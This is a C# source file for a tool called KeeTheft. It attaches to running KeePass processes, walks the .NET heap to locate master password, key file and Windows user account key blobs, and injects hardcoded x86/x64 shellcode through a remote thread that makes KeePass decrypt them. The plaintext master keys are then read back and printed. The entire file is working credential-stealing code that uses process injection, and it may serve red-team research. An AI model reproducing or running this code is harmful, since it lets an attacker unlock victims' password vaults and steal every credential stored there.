using System;
using System.Collections.Generic;
using Microsoft.Diagnostics.Runtime;
using System.Diagnostics;
using System.Threading;
using KeeTheft.Extensions;
using KeeTheft.KeyInfo;

namespace KeeTheft
{
    static class Program
    {
        public static ILogger Logger = new NullLogger();
        static void Main(string[] args)
        {
            Logger = new ConsoleLogger();
            Process[] Processes = Process.GetProcessesByName("keepass");

            foreach (var Proc in Processes)
            {
                GetKeePassMasterKeys(Proc);
            }
        }

        public static List<CompositeKeyInfo> GetKeePassMasterKeys(Process Proc)
        {
            List<CompositeKeyInfo> CompositeKeys = GetCompositeKeyInfo(Proc);

            if (CompositeKeys.Count > 0)
            {
                IntPtr ProcessHandle = IntPtr.Zero;
                try
                {
                    ProcessHandle = Win32.OpenProcess(Win32.ProcessAccessFlags.All, false, Proc.Id);  // 0x001F0FFF = All
                    if (ProcessHandle == IntPtr.Zero)
                    {
                        Logger.WriteLine("Error: Couldn't get a handle to process. PID: " + Proc.Id);
                    }

                    foreach (CompositeKeyInfo CompositeKey in CompositeKeys)
                    {
                        foreach (IUserKey key in CompositeKey.UserKeys)
                        {
                            ExtractKeyInfo(key, ProcessHandle, true);
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.WriteLine(e.Message);
                    throw;
                }
                finally
                {
                    if (ProcessHandle != null)
                        Win32.CloseHandle(ProcessHandle);
                }
            }

            return CompositeKeys;
        }

        public static void ExtractKeyInfo(IUserKey key, IntPtr ProcessHandle, bool DecryptKeys)
        {
            if (!DecryptKeys)
            {
                Logger.WriteLine(key);
            }
            else
            {
                IntPtr EncryptedBlobAddr = Win32.AllocateRemoteBuffer(ProcessHandle, key.encryptedBlob);
                byte[] Shellcode = GenerateDecryptionShellCode(EncryptedBlobAddr, key.encryptedBlob.Length);

                // Execute the ShellCode
                IntPtr ShellcodeAddr = Win32.AllocateRemoteBuffer(ProcessHandle, Shellcode);

                IntPtr ThreadId = IntPtr.Zero;
                IntPtr RemoteThreadHandle = Win32.CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ShellcodeAddr, IntPtr.Zero, 0, out ThreadId);
                if (RemoteThreadHandle == IntPtr.Zero)
                {
                    Logger.WriteLine("Error: Could not create a thread for the shellcode");
                    return;
                }

                // Read plaintext password!
                Thread.Sleep(1000);
                IntPtr NumBytes;
                byte[] plaintextBytes = new byte[key.encryptedBlob.Length];
                int res = Win32.ReadProcessMemory(ProcessHandle, EncryptedBlobAddr, plaintextBytes, plaintextBytes.Length, out NumBytes);
                if (res != 0 && NumBytes.ToInt64() == plaintextBytes.Length)
                {
                    key.plaintextBlob = plaintextBytes;
                    Logger.WriteLine(key);
                }

                // Dunno why, but VirtualFree was causing crashes...
                // Thread.Sleep(4000);  // Wait for the shellcode to finish executing
                // Win32.VirtualFreeEx(ProcessHandle, ShellcodeAddr, 0, Win32.FreeType.Release);
            }
        }

        public static byte[] GenerateDecryptionShellCode(IntPtr EncryptedBlobAddr, int EncryptBlobLen)
        {
            byte[] shellcode32 = { 0x83, 0xEC, 0x10, 0x53, 0x55, 0x56, 0x8D, 0x44, 0x24, 0x0C, 0xC7, 0x44, 0x24, 0x0C, 0x63, 0x72, 0x79, 0x70, 0x57, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0xC7, 0x44, 0x24, 0x18, 0x74, 0x62, 0x61, 0x73, 0xC7, 0x44, 0x24, 0x1C, 0x65, 0x2E, 0x64, 0x6C, 0x66, 0xC7, 0x44, 0x24, 0x20, 0x6C, 0x00, 0xE8, 0x49, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xB9, 0x93, 0x68, 0x09, 0x97, 0xE8, 0x3D, 0x00, 0x00, 0x00, 0xB9, 0x44, 0xF0, 0x35, 0xE0, 0x8B, 0xF8, 0xE8, 0x31, 0x00, 0x00, 0x00, 0x6A, 0x00, 0xBD, 0x42, 0x42, 0x42, 0x42, 0xBB, 0x41, 0x41, 0x41, 0x41, 0x55, 0x53, 0xB9, 0x93, 0x68, 0x11, 0x97, 0x8B, 0xF0, 0xE8, 0x17, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x68, 0xB8, 0x0B, 0x00, 0x00, 0xFF, 0xD6, 0x6A, 0x00, 0x55, 0x53, 0xFF, 0xD7, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x10, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44, 0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74, 0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04, 0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8, 0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B, 0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33, 0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF, 0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24, 0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56, 0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7, 0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB };
            byte[] shellcode64 = { 0xE9, 0x9B, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8B, 0xF1, 0x48, 0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x4A, 0x10, 0x4D, 0x8B, 0x41, 0x30, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xB9, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3C, 0x33, 0xD2, 0x4D, 0x8B, 0x09, 0xF3, 0x0F, 0x7F, 0x04, 0x24, 0x42, 0x8B, 0x9C, 0x00, 0x88, 0x00, 0x00, 0x00, 0x85, 0xDB, 0x74, 0xD4, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x44, 0x0F, 0xB7, 0xD0, 0x45, 0x85, 0xD2, 0x74, 0x21, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x45, 0x8B, 0xDA, 0x0F, 0xBE, 0x01, 0xC1, 0xCA, 0x0D, 0x80, 0x39, 0x61, 0x7C, 0x03, 0x83, 0xC2, 0xE0, 0x03, 0xD0, 0x48, 0xFF, 0xC1, 0x49, 0x83, 0xEB, 0x01, 0x75, 0xE7, 0x4D, 0x8D, 0x14, 0x18, 0x33, 0xC9, 0x41, 0x8B, 0x7A, 0x20, 0x49, 0x03, 0xF8, 0x41, 0x39, 0x4A, 0x18, 0x76, 0x8F, 0x8B, 0x1F, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD8, 0x48, 0x8D, 0x7F, 0x04, 0x0F, 0xBE, 0x03, 0x48, 0xFF, 0xC3, 0x41, 0xC1, 0xCB, 0x0D, 0x44, 0x03, 0xD8, 0x80, 0x7B, 0xFF, 0x00, 0x75, 0xED, 0x41, 0x8D, 0x04, 0x13, 0x3B, 0xC6, 0x74, 0x0D, 0xFF, 0xC1, 0x41, 0x3B, 0x4A, 0x18, 0x72, 0xD1, 0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x42, 0x24, 0x03, 0xC9, 0x49, 0x03, 0xC0, 0x0F, 0xB7, 0x04, 0x01, 0x41, 0x8B, 0x4A, 0x1C, 0xC1, 0xE0, 0x02, 0x48, 0x98, 0x49, 0x03, 0xC0, 0x8B, 0x04, 0x01, 0x49, 0x03, 0xC0, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x10, 0x5F, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x7C, 0x24, 0x10, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x30, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0xC7, 0x45, 0xF0, 0x63, 0x72, 0x79, 0x70, 0xC7, 0x45, 0xF4, 0x74, 0x62, 0x61, 0x73, 0xC7, 0x45, 0xF8, 0x65, 0x2E, 0x64, 0x6C, 0x66, 0xC7, 0x45, 0xFC, 0x6C, 0x00, 0xE8, 0xCD, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0xF0, 0xFF, 0xD0, 0xB9, 0x93, 0x68, 0x09, 0x97, 0xE8, 0xBD, 0xFE, 0xFF, 0xFF, 0xB9, 0x44, 0xF0, 0x35, 0xE0, 0x48, 0x8B, 0xF8, 0xE8, 0xB0, 0xFE, 0xFF, 0xFF, 0xB9, 0x93, 0x68, 0x11, 0x97, 0x48, 0x8B, 0xD8, 0xE8, 0xA3, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0xBA, 0x42, 0x42, 0x42, 0x42, 0xB9, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xD0, 0xB9, 0xB8, 0x0B, 0x00, 0x00, 0xFF, 0xD3, 0x45, 0x33, 0xC0, 0xBA, 0x42, 0x42, 0x42, 0x42, 0xB9, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xD7, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x53, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xE6, 0x5E, 0xC3 };
            byte[] shellcode = null;

            if (IntPtr.Size == 4)
                shellcode = shellcode32;
            else
                shellcode = shellcode64;

            int PasswordAddrOffset = shellcode.IndexOfSequence(new byte[] { 0x41, 0x41, 0x41, 0x41 }, 0);
            if (PasswordAddrOffset != -1)
                Array.Copy(BitConverter.GetBytes((ulong)EncryptedBlobAddr), 0, shellcode, PasswordAddrOffset, 4);
            else
                throw new Exception("Could not find address marker in shellcode");

            int PasswordLenOffset = shellcode.IndexOfSequence(new byte[] { 0x42, 0x42, 0x42, 0x42 }, 0);
            if (PasswordLenOffset != -1)
            {
                Array.Copy(BitConverter.GetBytes(EncryptBlobLen), 0, shellcode, PasswordLenOffset, 4);
            }

            return shellcode;
        }

        // Returns all the info about any Composite Keys stored in memory
        public static List<CompositeKeyInfo> GetCompositeKeyInfo(Process process)
        {
            List<CompositeKeyInfo> keyInfo = new List<CompositeKeyInfo>();
            DataTarget dt = null;
            string databaseLocation = "";

            try
            {
                dt = DataTarget.AttachToProcess(process.Id, 50000);

                if (dt.ClrVersions.Count == 0)
                {
                    string err = "CLR is not loaded. Is it Keepass 1.x, perhaps?";
                    Logger.WriteLine(err);
                    throw new Exception(err);
                }

                if (dt.ClrVersions.Count > 1)
                {
                    Logger.WriteLine("*** Interesting... there are multiple .NET runtimes loaded in KeePass");
                }

                ClrInfo Version = dt.ClrVersions[0];
                ClrRuntime Runtime = Version.CreateRuntime();
                ClrHeap Heap = Runtime.GetHeap();

                if (!Heap.CanWalkHeap)
                {
                    string err = "Error: Cannot walk the heap!";
                    Logger.WriteLine(err);
                    throw new Exception(err);
                }

                foreach (ulong obj in Heap.EnumerateObjectAddresses())
                {
                    ClrType type = Heap.GetObjectType(obj);

                    if (type == null || type.Name != "KeePassLib.PwDatabase")
                        continue;

                    Logger.WriteLine("************ Found a PwDatabase! **********");

                    List<ulong> referencedObjects = ClrMDHelper.GetReferencedObjects(Heap, obj);

                    // First walk the referenced objects to find the database path
                    foreach (ulong refObj in referencedObjects)
                    {
                        ClrType refObjType = Heap.GetObjectType(refObj);
                        if (refObjType.Name == "KeePassLib.Serialization.IOConnectionInfo")
                        {
                            ClrInstanceField UrlField = refObjType.GetFieldByName("m_strUrl");
                            ulong UrlFieldAddr = UrlField.GetAddress(refObj);
                            object Url = UrlField.GetValue(UrlFieldAddr, true);
                            databaseLocation = (string)Url;
                        }
                    }

                    if(databaseLocation != "")
                    {
                        Logger.WriteLine("*** PwDatabase location : " + databaseLocation);

                        referencedObjects = ClrMDHelper.GetReferencedObjects(Heap, obj);

                        // now walk the referenced objects looking for a master composite key
                        foreach (ulong refObj in referencedObjects)
                        {

                            ClrType refObjType = Heap.GetObjectType(refObj);
                            if (refObjType.Name == "KeePassLib.Keys.CompositeKey")
                            {

                                Logger.WriteLine("************ Found a CompositeKey! **********");
                                CompositeKeyInfo CompositeKey = new CompositeKeyInfo();

                                // Get all objects kept alive by the composite key.
                                // (A shortcut to get references to all Key types)
                                List<ulong> referencedObjects2 = ClrMDHelper.GetReferencedObjects(Heap, refObj);

                                foreach (ulong refObj2 in referencedObjects2)
                                {
                                    ClrType refObjType2 = Heap.GetObjectType(refObj2);

                                    if (refObjType2.Name == "KeePassLib.Keys.KcpPassword")
                                    {
                                        KcpPassword KcpPassword = GetKcpPasswordInfo(refObj2, refObjType2, Heap, databaseLocation);

                                        if (KcpPassword == null)
                                            continue;

                                        CompositeKey.AddUserKey(KcpPassword);
                                    }
                                    else if (refObjType2.Name == "KeePassLib.Keys.KcpKeyFile")
                                    {
                                        KcpKeyFile KcpKeyFile = GetKcpKeyFileInfo(refObj2, refObjType2, Heap, databaseLocation);

                                        if (KcpKeyFile == null)
                                            continue;

                                        CompositeKey.AddUserKey(KcpKeyFile);
                                    }
                                    else if (refObjType2.Name == "KeePassLib.Keys.KcpUserAccount")
                                    {
                                        KcpUserAccount KcpUserAccount = GetKcpUserAccountInfo(refObj2, refObjType2, Heap, databaseLocation);

                                        if (KcpUserAccount == null)
                                            continue;

                                        CompositeKey.AddUserKey(KcpUserAccount);
                                    }
                                }
                                if (CompositeKey.UserKeyCount > 0)
                                    keyInfo.Add(CompositeKey);

                            }
                        }
                    }
                }

                Logger.Write("\n");
            }
            catch (Exception e)
            {
                Logger.WriteLine(e.Message);
                throw;
            }
            finally
            {
                if (dt != null)
                {
                    dt.Dispose();

                }
            }

            return keyInfo;
        }

        public static KcpPassword GetKcpPasswordInfo(ulong KcpPasswordAddr, ClrType KcpPasswordType, ClrHeap Heap, string databaseLocation)
        {
            KcpPassword PasswordInfo = new KcpPassword();

            // Protected String
            ClrInstanceField KcpProtectedStringField = KcpPasswordType.GetFieldByName("m_psPassword");
            ulong KcpProtectedStringAddr = KcpProtectedStringField.GetAddress(KcpPasswordAddr);
            ulong KcpProtectedStringObjAddr = (ulong)KcpProtectedStringField.GetValue(KcpPasswordAddr);

            // Get the embedded ProtectedBinary
            ClrInstanceField KcpProtectedBinaryField = KcpProtectedStringField.Type.GetFieldByName("m_pbUtf8");
            ulong KcpProtectedBinaryAddr = KcpProtectedBinaryField.GetAddress(KcpProtectedStringObjAddr);
            ulong KcpProtectedBinaryObjAddr = (ulong)KcpProtectedBinaryField.GetValue(KcpProtectedStringObjAddr);

            ClrInstanceField EncDataField = KcpProtectedBinaryField.Type.GetFieldByName("m_pbData");
            ulong EncDataAddr = EncDataField.GetAddress(KcpProtectedBinaryObjAddr);
            ulong EncDataArrayAddr = (ulong)EncDataField.GetValue(KcpProtectedBinaryObjAddr);

            ClrType EncDataArrayType = Heap.GetObjectType(EncDataArrayAddr);
            int len = EncDataField.Type.GetArrayLength(EncDataArrayAddr);

            if (len <= 0 || len % 16 != 0) // Small sanity check to make sure everything's ok
                return null;

            byte[] EncData = new byte[len];
            for (int i = 0; i < len; i++)
            {
                EncData[i] = (byte)EncDataArrayType.GetArrayElementValue(EncDataArrayAddr, i);
            }

            PasswordInfo.databaseLocation = databaseLocation;
            PasswordInfo.encryptedBlob = EncData;
            PasswordInfo.encryptedBlobAddress = (IntPtr)KcpPasswordType.GetArrayElementAddress(EncDataArrayAddr, 0);
            PasswordInfo.encryptedBlobLen = len;

            return PasswordInfo;
        }

        public static KcpKeyFile GetKcpKeyFileInfo(ulong KcpKeyFileAddr, ClrType KcpKeyFileType, ClrHeap Heap, string databaseLocation)
        {
            KcpKeyFile KeyFileInfo = new KcpKeyFile();

            // key file path
            ClrInstanceField KcpStringField = KcpKeyFileType.GetFieldByName("m_strPath");
            ulong KcpStringFieldAddr = KcpStringField.GetAddress(KcpKeyFileAddr);
            object keyFilePath = KcpStringField.GetValue(KcpStringFieldAddr, true);

            // Get the embedded ProtectedBinary
            ClrInstanceField KcpProtectedBinaryField = KcpKeyFileType.GetFieldByName("m_pbKeyData");
            ulong KcpProtectedBinaryAddr = KcpProtectedBinaryField.GetAddress(KcpKeyFileAddr);
            ulong KcpProtectedBinaryObjAddr = (ulong)KcpProtectedBinaryField.GetValue(KcpKeyFileAddr);

            ClrInstanceField EncDataField = KcpProtectedBinaryField.Type.GetFieldByName("m_pbData");
            ulong EncDataAddr = EncDataField.GetAddress(KcpProtectedBinaryObjAddr);
            ulong EncDataArrayAddr = (ulong)EncDataField.GetValue(KcpProtectedBinaryObjAddr);

            ClrType EncDataArrayType = Heap.GetObjectType(EncDataArrayAddr);
            int len = EncDataField.Type.GetArrayLength(EncDataArrayAddr);

            if (len <= 0 || len % 16 != 0) // Small sanity check to make sure everything's ok
                return null;

            byte[] EncData = new byte[len];
            for (int i = 0; i < len; i++)
            {
                EncData[i] = (byte)EncDataArrayType.GetArrayElementValue(EncDataArrayAddr, i);
            }

            KeyFileInfo.databaseLocation = databaseLocation;
            KeyFileInfo.encryptedBlob = EncData;
            KeyFileInfo.encryptedBlobAddress = (IntPtr)KcpKeyFileType.GetArrayElementAddress(EncDataArrayAddr, 0);
            KeyFileInfo.encryptedBlobLen = len;
            KeyFileInfo.keyFilePath = keyFilePath.ToString();

            return KeyFileInfo;
        }

        public static KcpUserAccount GetKcpUserAccountInfo(ulong KcpUserAccountAddr, ClrType KcpUserAccountType, ClrHeap Heap, string databaseLocation)
        {
            KcpUserAccount UserAccountInfo = new KcpUserAccount();

            // Get the embedded ProtectedBinary
            ClrInstanceField KcpProtectedBinaryField = KcpUserAccountType.GetFieldByName("m_pbKeyData");
            ulong KcpProtectedBinaryAddr = KcpProtectedBinaryField.GetAddress(KcpUserAccountAddr);
            ulong KcpProtectedBinaryObjAddr = (ulong)KcpProtectedBinaryField.GetValue(KcpUserAccountAddr);

            ClrInstanceField EncDataField = KcpProtectedBinaryField.Type.GetFieldByName("m_pbData");
            ulong EncDataAddr = EncDataField.GetAddress(KcpProtectedBinaryObjAddr);
            ulong EncDataArrayAddr = (ulong)EncDataField.GetValue(KcpProtectedBinaryObjAddr);

            ClrType EncDataArrayType = Heap.GetObjectType(EncDataArrayAddr);
            int len = EncDataField.Type.GetArrayLength(EncDataArrayAddr);

            if (len <= 0 || len % 16 != 0) // Small sanity check to make sure everything's ok
                return null;

            byte[] EncData = new byte[len];
            for (int i = 0; i < len; i++)
            {
                EncData[i] = (byte)EncDataArrayType.GetArrayElementValue(EncDataArrayAddr, i);
            }

            UserAccountInfo.databaseLocation = databaseLocation;
            UserAccountInfo.encryptedBlob = EncData;
            UserAccountInfo.encryptedBlobAddress = (IntPtr)KcpUserAccountType.GetArrayElementAddress(EncDataArrayAddr, 0);
            UserAccountInfo.encryptedBlobLen = len;

            return UserAccountInfo;
        }


    }
}